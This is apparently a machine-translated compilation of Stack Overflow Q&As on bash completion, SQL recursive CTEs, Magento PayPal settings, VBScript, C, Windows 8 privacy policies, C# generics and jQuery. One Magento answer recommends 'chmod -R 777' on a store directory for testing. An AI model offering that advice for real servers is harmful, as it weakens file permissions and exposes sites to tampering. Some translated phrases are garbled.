以上是将表单值拉入数组的标准，但是，鉴于您的更新：

```
// Assuming "," separated values
   $unos = explode(",", $_POST['unos']);

   foreach ($unos as $item) {
       echo $item; // Do something with item
   } 
```

# bash - 在 vim 的 bash 完成中忽略文件扩展名

> ID：13280263
> 
> 赞同：4
> 
> 时间：2012-11-07T23:46:48.723
> 
> 标签：bash, vim, bash-completion

我写了一个小的 bash 函数来为 vim 提供补全。功能如下：

```
# completion for vim
_vim()
{
    local cur prev

    COMPREPLY=()
    _get_comp_words_by_ref cur prev

    case $prev in
        -h|--help|-v|--version)
            return 0
            ;;
    esac

    if [[ "$cur" == -* ]] ; then
        local _vopts='-v -e -E -s -d -y -R -Z -m -M -b -l -C'
        _vopts="${_vopts} -N -V -D -n -r -r -L -A -H -F -T -u"
        _vopts="${_vopts} --noplugin -p -o -O --cmd -c -S -s -w -W"
        _vopts="${_vopts} -x -X --remote --remote-silent --remote-wait"
        _vopts="${_vopts} --remote-wait-silent --remote-tab --remote-send"
        _vopts="${_vopts} --remote-expr --serverlist --servername"
        _vopts="${_vopts} --startuptime -i -h --help --version"
        COMPREPLY=( $( compgen -W "${_vopts}" \
            -- "$cur" ) )
        return 0
    fi

    local _VIM_IGNORE=".pdf:.dvi:.jpg:.pyc:.exe:.tar:.zip:.ps"
    FIGNORE="${_VIM_IGNORE}" _filedir
} &&
complete -F _vim vim vi v gv vd 
```

我试图通过定义 _VIM_IGNORE 变量并将 FIGNORE 设置为它来忽略扩展名为 pdf、dvi 等的文件，但这不起作用。

知道如何做到这一点吗？

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-12T14:30:01.093

我还没有找到任何文档，但根据我的实验，它似乎`FIGNORE`不会影响`compgen()`/ `_filedir()`（它只是前者的包装器）处理本身。只有在触发完成的 shell 中设置它时，它才会影响完成（但随后是全局的，这不是您想要的）。

我猜你不能`FIGNORE`以这种聪明的方式使用，并且必须自己显式地实现`COMPREPLY`数组的过滤器。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T02:11:06.140

感谢 Ingo 的建议，这是我的解决方案：

```
function _vim()
{
  local cur prev idx ext

  COMPREPLY=()
  _get_comp_words_by_ref cur prev

  case $prev in
    -h|--help|-v|--version)
      return 0
      ;;
  esac

  if [[ "$cur" == -* ]] ; then
    local _vopts='-v -e -E -s -d -y -R -Z -m -M -b -l -C'
    _vopts="${_vopts} -N -V -D -n -r -r -L -A -H -F -T -u"
    _vopts="${_vopts} --noplugin -p -o -O --cmd -c -S -s -w -W"
    _vopts="${_vopts} -x -X --remote --remote-silent --remote-wait"
    _vopts="${_vopts} --remote-wait-silent --remote-tab --remote-send"
    _vopts="${_vopts} --remote-expr --serverlist --servername"
    _vopts="${_vopts} --startuptime -i -h --help --version"
    COMPREPLY=( $( compgen -W "${_vopts}" \
      -- "$cur" ) )
    return 0
  fi

  local _VIM_IGNORE=(pdf xdvi jpg pyc exe tar zip ps)
  _filedir
  for idx in ${!COMPREPLY[@]}; do
    ext=${COMPREPLY[$idx]}
    ext=${ext##*.}
    for iext in ${_VIM_IGNORE[@]}; do
      if test "$ext" = "$iext"; then
        unset -v COMPREPLY[$idx]
        break
      fi
    done
  done
  return 0
} 
```

如果文件以被忽略的扩展名之一结尾，则将其从数组中删除。

# sql - 在没有游标的 SQL 中展平 SQL 分层数据结构

> ID：13280265
> 
> 赞同：2
> 
> 时间：2012-11-07T23:47:01.790
> 
> 标签：sql, sql-server, sql-server-2008, hierarchical-data

假设我有下表

```
SectionID ParentIDSection DatumID
   1           NULL         1
   2            1           2
   3            1           3
   4            2           4 
```

现在，假设我想选择 SectionID = 1 下的所有 DatumID，即使它是其后代子项的一部分，这样我也会得到

```
SectionID DatumID
  1         1
  1         2
  1         3
  1         4 
```

如果不使用游标递归地显式迭代第一个表，是否可以做到这一点？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-08T00:19:59.860

这让我困惑了一分钟，因为它有点与我对递归的看法相反，但我想出了这个非常简单的解决方案：

```
;WITH Rollups AS (
    SELECT SectionId, ParentIdSection, DatumId
    FROM SectionDataTable
    UNION ALL
    SELECT parent.SectionId, parent.ParentIdSection, child.DatumId
    FROM SectionDataTable parent 
    INNER JOIN Rollups child ON child.ParentIdSection = parent.SectionId
)
SELECT *
FROM Rollups 
WHERE SectionID = 1 
```

（替换为您想要的部分 id）

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-11-08T00:32:13.697

```
declare @demo table
(
    SectionId int not null primary key clustered
    , ParentId int null --foreign key references @demo(SectionId)
    , DatumId int
);

insert @demo
      select 1, null, 1
union select 2, 1, 2
union select 3, 1, 3
union select 4, 2, 4
union select 5, null, 5
union select 6, 5, 6
;

with demoHierarchy
as
(
    select SectionId
    , SectionId ParentId
    , SectionId OriginalAncestorId
    , DatumId
    from @demo
    where ParentId is null --remove this line if you want OriginalAncestorId to be AnyAncestorId (if that doesn't make sense, try it and see)

    union all

    select d.SectionId
    , d.ParentId
    , h.OriginalAncestorId
    , d.DatumId
    from @demo d
    inner join demoHierarchy h
    on d.ParentId = h.SectionId
    where d.ParentId is not null --implied by the join, but here to make it explicit
)
select OriginalAncestorId SectionId
, DatumId 
from demoHierarchy
where OriginalAncestorId = 1 --not needed given your sample data only contains this data, but required when you have multiple root ancestors 
```

此处提供有关分层查询的更多信息：http: [//blog.sqlauthority.com/2012/04/24/sql-server-introduction-to-hierarchical-query-using-a-recursive-cte-a-primer/](http://blog.sqlauthority.com/2012/04/24/sql-server-introduction-to-hierarchical-query-using-a-recursive-cte-a-primer/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-08T00:11:31.203

您可以在 MS SQL 2008 中使用 Hierarchy ID。另一个问题是关于[SQL Server 2008 Hierarchy Data Type Performance 的相对性能？](https://stackoverflow.com/questions/1045743/sql-server-2008-hierarchy-data-type-performance).

这是处理递归层次结构的另一个参考：http: [//www.bimonkey.com/2009/09/handling-recursive-hierarchies-in-sql-server/](http://www.bimonkey.com/2009/09/handling-recursive-hierarchies-in-sql-server/)

# c# - asp.net mvc 3中的表单身份验证-ActionResult注册方法-如何？

> ID：13280273
> 
> 赞同：0
> 
> 时间：2012-11-07T23:48:23.167
> 
> 标签：c#, asp.net-mvc-3, forms-authentication

你能帮我么。我已经在 asp.net mvc 3 中使用表单身份验证正确编写了登录和注销方法。

```
[HttpPost]
public ActionResult LogOn(Guest guest, String returnURL, bool RememberMe = false)
{
    var isValidURL = bl.IsValidReturnUrl(returnURL);

    if (!ModelState.IsValid)
    {
        ModelState.AddModelError("", "The username or password provider is incorrect");
        return View(guest);
    }

    if (bl.IsUserValidated(guest.Username, guest.Password))
    {
        FormsAuthentication.SetAuthCookie(guest.Username, RememberMe);
        if (isValidURL)
            return Redirect(returnURL);
        else
            return RedirectToAction("Home", "Index");
    }
    return View(guest);
} 
```

如何编写**注册**控制器方法，我不知道从哪里开始，我有自己的数据库，我应该在其中插入新注册用户及其用户名、密码和电子邮件。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-07T23:57:01.087

通常，您会获得他们的注册详细信息（至少是用户名和密码，但最好还有电子邮件）并将其发送回注册操作。

检查用户名和密码是否符合您的条件。然后，检查重复的用户。如果没有，您注册到数据库并通知他们他们已注册。

您应该首先将他们的帐户注册为非活动帐户，然后向他们发送一封带有激活链接的电子邮件。当他们访问链接时，让您的操作将帐户设置为活动状态并通知他们现在他们可以使用该网站。

这有帮助吗？

# magento - Magento 1.7.0.2 中的 PayPal 设置无法保存

> ID：13280274
> 
> 赞同：3
> 
> 时间：2012-11-07T23:48:36.567
> 
> 标签：magento, paypal, magento-1.7

我正在尝试在 Magento 1.7.0.2 中保存 PayPal Payments Pro 设置，但运气不佳。无论我在设置中输入什么，当我保存配置时，它都会给我一个“配置已保存”。消息，但 PayPal 设置将为空。这适用于任何 PayPal 方法，无论我输入什么凭据或选项（只要它们通过前端验证）。

我已经查看了我能想到的每个日志文件，并且没有出现任何错误。不是窥视。我也在我的本地环境和部署的测试环境中尝试过这个，两者的行为方式相同。

有没有人有任何建议或想法？无法测试这种方法肯定会阻碍我，这对我的商店来说是必不可少的。

感谢你的帮助！谢谢。（我也在 Magento 论坛上发布了这个，如果我找到它，我会在这里发布任何有用的信息。）

编辑：这是我输入的图像，带有双层测试凭据。我希望它会引发某种错误，但我只会获得成功，然后刷新时会出现空白表格。

![形式](../Images/563d8296cf647af8903121289fdb6942.png)

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-27T22:18:55.780

原来这个错误是由另一个错误的核心覆盖引起的。此处解释了导致问题的覆盖：http: [//www.magentocommerce.com/boards/26245/viewthread/285220/](http://www.magentocommerce.com/boards/26245/viewthread/285220/)

删除上述代码可以解决问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-08T08:34:27.280

尝试清理缓存并重新索引。也做一个 chomd -R 777 用于测试目的，看看它是否可以工作。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-19T22:52:39.497

如果你还有这个问题，

这是因为 magento 将 paypal 的货币支持更改为取决于您网站的基础货币，

我已经制作了修复此问题的模块，并允许您使用具有兑换率等的贝宝的多币种。

检查[https://github.com/Meabed/Paypal-Multi-Currency-Magento](https://github.com/Meabed/Paypal-Multi-Currency-Magento)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-09-02T11:06:15.760

我在 Magneto 1.8.1 上遇到了同样的问题，但我没有设置 PayPal...

我有一个想法，尝试在 Internet Explorer 中保存配置（我通常使用 Chrome）并且它成功了！

希望这可以帮助！

# c# - 通过单击链接按钮显示视频叠加层

> ID：13280277
> 
> 赞同：1
> 
> 时间：2012-11-07T23:48:59.890
> 
> 标签：c#, javascript, video, overlay

我有一个带有网格视图的页面。根据数据库中是否有视频网址，其中的一列显示播放图标。这部分是：

```
<asp:TemplateField HeaderText="" ItemStyle-CssClass="video" >
    <ItemTemplate>
        <asp:LinkButton ID="lbtVideoUrl" runat="server" OnClientClick="javascript:clicker('http://www.youtube.com/watch?v=qySK7GWFEAg')" ><img class='<%# Eval("Class", "{0}")  %>' src='<%# Eval("VideoImage", "{0}")  %>' alt="Video" title='<%# Eval("ToolTip", "{0}")  %>' /></asp:LinkButton>
    </ItemTemplate>
</asp:TemplateField> 
```

应该处理这个的javascript是：

```
function clicker(theUrl) {
    var thediv = document.getElementById('displaybox');
    if (thediv.style.display == "none") {
            thediv.style.display = "";
            thediv.innerHTML = "<table width='100%' height='100%'><tr><td align='center' valign='middle' width='100%' height='100%'><object width='640' height='360'><param name='movie' value='" + theUrl + "'></param><param name='allowFullScreen' value='true'></param><param name='allowscriptaccess' value='always'></param><embed src='" + theUrl + "' type='application/x-shockwave-flash' width='640' height='360' allowscriptaccess='always' allowfullscreen='true'></embed></object><br><br><a href='#' onclick='return clicker();'>CLOSE WINDOW</a></td></tr></table>";
    } else {
        thediv.style.display = "none";
        thediv.innerHTML = '';
    }
    return false;
} 
```

但是，当我单击按钮时，我会看到灰色叠加层和视频字段，但在显示任何内容之前，叠加层再次关闭。我一定错过了什么，但不知道是什么......

还有一条信息（不知道是否相关）：我必须在后面的代码中添加以下内容才能让它“工作”到目前为止：

```
protected void gv_SelectedIndexChanged(object sender, EventArgs e)
{
} 
```

PS下一步是从数据库中获取url，所以我可以为不同的图标添加不同的链接。

# jquery - jQuery.post：它会触发任何事件吗？

> ID：13280279
> 
> 赞同：-1
> 
> 时间：2012-11-07T23:49:04.037
> 
> 标签：jquery

我试图做一个“自动”加载指示器..为此，我想监听应用程序上的 ajax 事件，并显示/隐藏指示器。

我现在唯一的问题是，我不知道 jquery 在执行一些 ajax 调用时触发了什么事件（`$.ajax`, `$.post`, `$.get`...）

医生对此有任何说法。如果不向所有呼叫添加额外代码，我该如何做到这一点？提前致谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-07T23:50:33.333

是的，您可以通过[`ajaxSetup`](http://api.jquery.com/jQuery.ajaxSetup/). [文档](http://api.jquery.com)中还描述了[`ajaxStart`](http://api.jquery.com/ajaxStart/),[`ajaxStop`](http://api.jquery.com/ajaxStop/)和许多其他内容。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-07T23:57:16.727

是的，它会触发回调。$.ajax 有以下回调：成功、错误、完成。检查文档以获取更多[http://api.jquery.com/jQuery.ajax/](http://api.jquery.com/jQuery.ajax/)

# lotus-domino - Lotus Domino 数据库的文档字段中如何填充损坏的值？

> ID：13280280
> 
> 赞同：0
> 
> 时间：2012-11-07T23:49:15.077
> 
> 标签：lotus-domino, lotus, lotusscript

拥有已使用 13 年的 Lotus Domino 数据库。

今天，一个名为 NumApprovers 的隐藏可编辑字段已开始在多个文档中出现乱码值。

![在此处输入图像描述](../Images/964674fac1f0cc21dc6c9cdb3b522ec8.png)

该字段由 lotusscript 更新，它计算多值字段中有多少个名称。

lotusscript 多年来没有改变 - 所以不知道为什么这个字段突然变得奇数。

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T03:34:45.640

遗憾的是，我看不到您发布的图像，因此难以诊断。

需要考虑的一些事情... Lotus Notes 可能会让您在多年后因查找时出现 64k 错误而感到悲痛。如果您从@dblookup 或@dbcolumn 的视图中查找项目列表，那么一旦您达到此限制，它将在不通知的情况下翻倒。在 32k 或 64k 上还有一些其他数据限制，这就是我怀疑你遇到的问题。复制并删除一些较旧的数据，看看是否可以解决副本中的问题。

第二件事是数据库损坏。数据库有时会损坏。我会复制数据库并运行“加载修复” - 请参阅您的管理员帮助或[http://www-12.lotus.com/ldd/doc/domino_notes/7.0/help7_admin.nsf/Links/H_RUNNING_FIXUP_USING_THE_SERVER_STATUS_TAB_7476_STEPS](http://www-12.lotus.com/ldd/doc/domino_notes/7.0/help7_admin.nsf/Links/H_RUNNING_FIXUP_USING_THE_SERVER_STATUS_TAB_7476_STEPS)

最后，它取决于办公桌检查时间。获取数据库的副本并通过 out 添加调试消息，例如

```
Print "Info: View returned " + cstr(view.entries) +  entries" 
```

继续深入研究该过程，直到找到发生损坏的原因。

高温高压

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-07-18T03:49:03.477

要考虑的另一件事是，您可以让您的用户在更新时签署文档，这可以帮助您至少识别哪些机器/用户导致了损坏。我不相信您的用户会随机开始这样做（尤其是在 13 年后），所以我认为这更有可能是使用 EOL 后硬件的问题，这会导致写入时出现位错误。

但是，无论哪种方式，答案都可能是“导致损坏的硬件故障”，而不是基于时间的软件故障。

# delphi - EOF 错误 Delphi 快速报告 4

> ID：13280284
> 
> 赞同：0
> 
> 时间：2012-11-07T23:49:37.060
> 
> 标签：delphi, delphi-5, fastreport

帮助！！！当我从 Delphi 调用一个简单 ADOQuery 的预创建报告时，在预创建报告中我没有设置主数据带中的行数，我收到 EOF 错误（EOF OR BOF 为真或当前记录已被删除）。然后报告加载就好了。但是，如果我将数量设置为小于或等于主数据的行数，那么我不会收到该错误。在从delphi调用的报告中触发ado查询时是否需要知道主记录的数量？这是我用来调用报告的代码：

```
...

var Connection1 : tfrxAdoDatabase; //connection variable
    Query1 : tfrxADOQuery;
 ...

with tfrxReport.create(self) do
  try
      //Load Report
      LoadFromFile(ReportName);
      //load connection properties
      Connection1 := FindObject('Connection1') as tfrxAdoDatabase;
      //define connection username and password
      Connection1.setlogin('sysdba','BLAHBLAH');
      // prepare and show report
      if Preparereport then
      ShowPreparedReport;
    finally
      end; 
```

我是使用快速报告的新手（本周是我第一次使用它。我真的很挣扎，所以任何帮助将不胜感激）

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-08T19:15:39.277

Ken 是对的，它是 ADO 错误，问题在于 frxadocomponent 集与 delphi 交互的方式。那里有针对 Delphi 的 ado 组件的更新，但是因为不再支持 Delphi 5，所以很难找到。我确实在这里找到了它：http: [//alexandrecmachado.blogspot.com/2009/07/delph-5-update-packs.html](http://alexandrecmachado.blogspot.com/2009/07/delph-5-update-packs.html) 感谢您的帮助肯

# vb.net - 这个脚本是用什么语言写的？

> ID：13280285
> 
> 赞同：0
> 
> 时间：2012-11-07T23:49:49.850
> 
> 标签：vb.net, language-agnostic, vb6, vbscript

```
CreateObject("Wscript.Shell").Run "taskkill /f /t /im oovoo.exe", 0, False 
```

我知道它是 Visual Basic 的一些变体，而且我知道它不是 .NET。是 VB6，还是我不知道的其他某种 VB 脚本语言？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-11-07T23:50:55.187

这是[VBScript](http://en.wikipedia.org/wiki/VBScript)（通常带有 .vbs 扩展名）。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-11-09T16:20:59.640

虽然这可能是 VBScript，但它也是可接受且合法的 VB6 代码片段。

# c - 无法正确输出一行

> ID：13280286
> 
> 赞同：0
> 
> 时间：2012-11-07T23:49:54.097
> 
> 标签：c, printf, output

我制作了这个程序，它可以生成两个骰子的掷骰子，然后将它们相加，然后显示它尝试了多少次。我的问题是程序将它们全部正确添加，它似乎无法打印成功达到您在开始时输入的总数所需的尝试次数。我想要的预期输出示例如下。

```
 Dice Thrower
  ============
  Total sought : 7
  Result of throw 1 : 4 + 4
  Result of throw 2 : 1 + 4
  Result of throw 3 : 2 + 6
  Result of throw 4 : 1 + 1
  Result of throw 5 : 4 + 3
  You got your total in 5 throws! 
```

这是我的代码。

```
 #include <stdio.h>
   #include <stdlib.h>
   #include <time.h>

   int validator();      //Function to validate
   void clear(void);     //Clear function

   int main() {

    int i=0,counter = 0, input, SUM, random1, random2;  //Variables

    printf("Dice Thrower\n");         //Print statements
    printf("============\n");
    printf("Total sought : ");
    input = validator();              //Call Function Validator

    srand(time(NULL));

    for (i = 2; SUM!= input; i++)    //For Loop for random dice throws

    {

            random1 = rand()%6+1;
            random2 = rand()%6+1;
            SUM = random1 + random2;
            counter++;
            printf("Result of throw %d : %d + %d\n", counter, random1, random2);

      if (SUM == i)

           {

           printf("You got your total in %d throws!\n", counter);        //Print                   statement for final total

           }
    }
    return 0;
}        

  int validator()                       //Validator function

  {

   int tries = 1, boss, returnvalue;
  char k;

  do{

boss =  scanf("%d%c", &returnvalue,&k);

    if (boss == 0)
    {

    printf ("Invalid input, Try again : ");
    clear();
    }

    else if(returnvalue >= 13 || returnvalue <= 1)

           {

           printf("Invalid integer entered, please enter an integer greater than or equal to 2 and less than or equal to 12 : ");

           }

    else if(k != '\n')

           {

           printf("Trailing characters present, reenter : ");
           clear();
           }

    else
           {

           tries = 0;

           }

} while ( tries == 1);

    return returnvalue;

      }

      void clear (void) {                //Clear function

      while ( getchar() != '\n' );

      } 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T23:54:23.470

我认为你应该改变这个条件`if (SUM == i)`如下：

```
 if (SUM == input) 
```

因为你想`SUM`比较`input`.

# tortoisesvn - 与 TortoiseSVN 共享 SSRS 解决方案

> ID：13280288
> 
> 赞同：1
> 
> 时间：2012-11-07T23:50:02.877
> 
> 标签：tortoisesvn

我对 SVN 相当陌生。我们中有两个人在使用 Tortoise SVN。我们有一个大型 BI 项目，其中包含许多我们都维护的报告。我们可以同时添加新报告或修改不同的报告。我们目前在 repo 下有解决方案和项目文件，但这会导致问题。如果我们俩都在同一天添加报告，并且我们中的一个提交，那么另一个就会发生冲突。（我还没有管理冲突的知识/经验。）

另一件事是解决方案始终显示为已修改。

这方面的最佳做法是什么？将 .sln 和 .rptproj 文件从存储库中删除并手动将新报告添加到我们自己的副本中会更好吗？

非常感谢任何帮助。

问候

标记

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-01-30T13:45:22.997

我有一个非常相似的问题。有没有人设法令人满意地解决它？有人建议的一件事是将 .rptproj 文件更改为“ignore-on-commit”..这可能会有所帮助。

.rptproj 文件是 xml 文件，看起来不太复杂，无法进行比较和合并。反正不像 .rdl 文件那么难！

更多信息： [https ://groups.google.com/forum/#!topic/tortoisesvn/DuV1EFvvCtM](https://groups.google.com/forum/#!topic/tortoisesvn/DuV1EFvvCtM)

我认为这可能会有所帮助，但仍然不理想。

# c# - 您应该在 Windows 8 应用程序的哪个位置编写“隐私政策”？

> ID：13280292
> 
> 赞同：7
> 
> 时间：2012-11-07T23:50:32.007
> 
> 标签：c#, xaml, windows-8, microsoft-metro, .net-4.5

我的应用程序未通过认证，原因是：*“4.1.1 如果您的应用程序具有网络功能，则必须有隐私声明......您必须在应用程序的描述页面以及应用程序的设置中提供对隐私政策的访问权限如 Windows 设置魅力中所示。”*

他们在说什么？什么描述？如何设置 Windows 设置中显示的信息？

该应用程序是 C#

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-11-09T05:36:05.893

要添加指向您的隐私政策的链接：

```
//using Windows.UI.ApplicationSettings;
//using System;

// You can put this event handler somewhere in a main class that runs your app.
// I put it in may main view model.
SettingsPane.GetForCurrentView().CommandsRequested += ShowPrivacyPolicy;

// Method to add the privacy policy to the settings charm
private void ShowPrivacyPolicy(SettingsPane sender, SettingsPaneCommandsRequestedEventArgs args)
{
    SettingsCommand privacyPolicyCommand = new SettingsCommand("privacyPolicy","Privacy Policy", (uiCommand) => { LaunchPrivacyPolicyUrl(); });
    args.Request.ApplicationCommands.Add(privacyPolicyCommand);
}

// Method to launch the url of the privacy policy
async void LaunchPrivacyPolicyUrl()
{
    Uri privacyPolicyUrl = new Uri("http://www.yoursite.com/privacypolicy");
    var result = await Windows.System.Launcher.LaunchUriAsync(privacyPolicyUrl);
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-11-07T23:57:09.673

您应该说明您的应用程序是否正在收集任何信息以及您正在使用它做什么。如果你不这样做，仍然这样说。

根据他们的规则，您应该在两个不同的位置显示这样的通知：

*   在应用程序描述中（显然是在应用程序商店中可见的内容）。
*   在设置菜单中。

我假设后者可以是任何自定义标签或显示控件显示此类通知的文本。只需阅读[第 4.1.1 节。在这里](http://msdn.microsoft.com/en-us/library/windows/apps/hh694083.aspx)。请记住，这可以是发送到互联网的任何数据，例如高分、配对信息或只是一些数据更新检查。

如果你使用某种高分列表，你可以只包括一些这样的通知：

> 如果您选择这样做，此应用程序会将您的高分和您的昵称传输到我们的服务器。我们不会与任何第三方共享这些数据，只会将其用于编制官方高分榜。

我不是律师，因此无法根据您的应用程序为您提供任何真正适当和准确的政策，但它应该让您了解他们正在寻找什么。如果您仍然不确定，请尝试检查应用是否与您的类似。

可以在 MSDN 和[此博客文章](http://blogs.msdn.com/b/going_metro/archive/2012/04/22/integrating-with-windows-8-settings-charm.aspx)中找到有关设置魅力的更多信息。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-11-12T22:03:35.920

无需打开网页链接，您可以直接在代码本身中编写隐私政策。在 App.xaml.cs 中，粘贴以下代码

```
 private void OnCommandsRequested(SettingsPane sender, SettingsPaneCommandsRequestedEventArgs args)
    {
       var privacy = new SettingsCommand("PrivacyPolicy", "PrivacyPolicy", (handler) =>
            {
                var settings = new SettingsFlyout();
                settings.Content = new PrivacyUserControl();
                //settings.HeaderBrush = new SolidColorBrush(_background);
                //settings.Background = new SolidColorBrush(_background);
                settings.HeaderBrush = _Hbackground;
                settings.Background = _background;
                settings.HeaderText = "Privacy Policy";
                settings.IsOpen = true;
            });

        args.Request.ApplicationCommands.Add(privacy);

        UICommandInvokedHandler handler1 = new UICommandInvokedHandler(onSettingsCommand);

           //  throw new NotImplementedException();
    }

 void onSettingsCommand(IUICommand command)
    {
        SettingsCommand settingsCommand = (SettingsCommand)command;
        ((Frame)Window.Current.Content).Navigate(typeof(HelpPage), "");
    } 
```

创建一个新的用户控件

```
<UserControl
xmlns:common="using:App.Common"
x:Class="App.UserControl"
xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
xmlns:local="using:App"
xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
mc:Ignorable="d"
d:DesignHeight="300"
d:DesignWidth="400">

<Grid>
    <StackPanel >
        <TextBlock Foreground="White"  Text="Privacy Policy" FontFamily="Segoe UI" FontWeight="SemiLight" FontSize="26.667" />
        <TextBlock Margin="0,50,0,0" Foreground="White" Text="put your notes here" FontFamily="Segoe UI" FontWeight="SemiLight" FontSize="18" TextWrapping="Wrap" />
    </StackPanel>
</Grid> 
```

* * *

## 回答 #4

> 赞同：3
> 
> 时间：2012-11-08T00:03:20.367

在最近的 MS win8 devcamp 上，我们被告知最简单的选择是在应用程序的设置魅力中放置一个指向您的在线隐私政策的链接。

您可以在此处找到一些 C# 实验室的动手操作：

[http://msdn.microsoft.com/en-us/windows/apps/jj674832](http://msdn.microsoft.com/en-us/windows/apps/jj674832)

其中包含一个名为“Lab_Settings_CS”的演示，您可以复制并粘贴将“关于”页面更改为“隐私政策”页面 - 它只是一个新的用户控件。

* * *

## 回答 #5

> 赞同：2
> 
> 时间：2012-11-17T09:42:21.003

如果您的应用不包含任何隐私政策并且在认证中您遇到相同的 4.1 错误，那么您必须遵循非常简单的步骤：

1.  打开你的项目
2.  在解决方案资源管理器中双击 package.appxmanifest。
3.  打开功能选项卡。
4.  取消选中互联网客户端。
5.  创建应用程序包并将其上传到 windows 商店。

就这样！:)

# c# - 检索关闭泛型类型的泛型类型的未关闭类型

> ID：13280294
> 
> 赞同：6
> 
> 时间：2012-11-07T23:50:35.877
> 
> 标签：c#, generics, generic-programming

我在获取泛型的未封闭类型时遇到了问题（可能是由于我对 C# 泛型不熟悉）。除了使用的显式验证器接口外，我有几种方法看起来与以下方法非常相似。

```
public IEnumerable<IDeleteValidator<T>> GetDeleteValidators<T>()
{
    var validatorList = new List<IDeleteValidator<T>>();
    foreach (var type in GetRecursiveBaseTypesAndInterfaces(typeof(T)))
    {
        var validatorType = typeof(IDeleteValidator<>).MakeGenericType(type);
        var validators = ObjectFactory
            .GetAllInstances(validatorType).Cast<IDeleteValidator<T>>();
        validatorList.AddRange(validators);
    }
    return validatorList;
} 
```

GetRecursiveBaseTypesAndInterfaces 方法按照它所说的执行并收集给定类型的所有基本类型和接口。所以我最终要做的是获取显式验证器接口的未封闭类型，并在每个原始类型 T 的基类和接口上获取它的类型。这很好用，但是我想清理我的代码并以比上面更通用的形式完成此操作

知道 T 的任何验证器都会扩展 IValidator（如下所示）

```
public interface IDeleteValidator<in T> : IValidator<T> {} 
```

我对上述方法的通用版本的**未完成尝试如下所示：**

```
public IEnumerable<TValidator> GetValidators<T, TValidator>() 
    where TValidator : IValidator<T>
{
    var validatorList = new List<TValidator>();
    foreach (var type in GetRecursiveBaseTypesAndInterfaces(typeof(T)))
    {
        var unclosedType = ???
        var validatorType = typeof(unclosedType).MakeGenericType(type);
        var validators = ObjectFactory
            .GetAllInstances(validatorType).Cast<TValidator>();
        validatorList.AddRange(validators);
    }
    return validatorList;
} 
```

如何定义*unclosedType*（或重组方法）以通过调用

```
GetValidators<Whatever, IDeleteValidator<Whatever>>(); 
```

或者是否可以进一步改进我的方法，以便像下面这样的调用就足够了？

```
GetValidators<IDeleteValidator<Whatever>>(); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T23:52:38.370

我没有完全听懂这个问题（更多是因为我的困倦而不是其他任何事情），但你是否在追求：

```
var unclosedTyped = type.GetGenericTypeDefinition(); 
```

? （有关详细信息，请参阅[文档](http://msdn.microsoft.com/en-us/library/system.type.getgenerictypedefinition.aspx)。）

# jquery - 无法在 jQuery 中对日期进行排序

> ID：13280297
> 
> 赞同：-1
> 
> 时间：2012-11-07T23:50:48.993
> 
> 标签：jquery

我一直在尝试通过 jQuery 中的升序/降序对日期进行排序，但没有运气。知道出了什么问题吗？这是我的代码：http: [//jsfiddle.net/UdwNh/](http://jsfiddle.net/UdwNh/)

```
 var itemsArray = $('div#activity_box');
    itemsArray.sort(function(a,b){
        var aTime = new Date($(a).find('#activity_date').text()).getTime();
        var bTime = new Date($(b).find('#activity_date').text()).getTime();
        return aTime - bTime;
    });

    $('#sortAsc').click(function(){
        $("#wrapper").empty();
        $(itemsArray).each(function(){
            $("#wrapper").prepend($(this));
        });
    });

    $('#sortDesc').click(function(){
        $("#wrapper").empty();
        $(itemsArray).each(function(){
            $("#wrapper").append($(this));
        });
    });​ 
```

相关HTML：

```
<input class="btn" type="button" value="Sort Ascending" id="sortAsc"/>
<input class="btn" type="button" value="Sort Descending" id="sortDesc"/>

<div id="wrapper">
    <ul>
    <li class='item'><div id='activity_date'>01/10/2012</div>
    <div id='activity_box'>
    <div id='activity_text' class='windowClass2'>...text here...</div>
    </div></li><li class='item'><div id='activity_date'>04/10/2012</div>
    <div id='activity_box'>
    <div id='activity_text' class='windowClass2'>...text here...</div>
    </div></li><li class='item'><div id='activity_date'>10/10/2012</div>
    <div id='activity_box'>
    <div id='activity_text' class='windowClass2'>...text here...</div>
    </div></li><li class='item'><div id='activity_date'>16/10/2012</div>
    <div id='activity_box'>
    <div id='activity_text' class='windowClass2'>...text here...</div>
    </div></li>
    </ul>
</div> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-07T23:53:11.453

该代码有几个问题。

1.  您`id`在多个元素上使用相同的值。[`id`值在页面上***必须***是唯一的](http://www.w3.org/TR/html5/global-attributes.html#the-id-attribute)。

    要修复它，请改用类值，或[`data-*`属性](http://www.w3.org/TR/html5/global-attributes.html#embedding-custom-non-visible-data-with-the-data-%2a-attributes)，或允许在页面上多次出现的任何其他内容。

2.  您正在调用`sort`一个 jQuery 实例。jQuery[没有记录`sort`功能](http://api.jquery.com)。它可能有一个无证的，但如果是这样，你不知道它做了什么。假设它会重新排列 DOM 元素当然是没有意义的。

